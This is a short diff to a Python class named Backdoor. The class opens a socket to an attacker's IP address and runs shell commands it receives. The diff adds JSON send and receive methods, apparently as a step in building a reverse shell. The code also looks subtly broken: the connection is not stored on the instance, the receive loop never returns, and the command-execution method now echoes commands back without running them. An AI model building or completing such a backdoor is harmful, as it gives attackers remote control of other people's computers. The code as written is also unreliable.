@@ -1,3 +1,4 @@
+import json
 import socket
 import subprocess
 
@@ -9,8 +10,21 @@ class Backdoor:
         connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         connection.connect((attacker_ip, port))
 
+    def send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def receive(self):
+        json_data = ''
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+            except ValueError:
+                continue 
+
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        self.send(command)
+        return self.receive()
 
     def run(self):
 
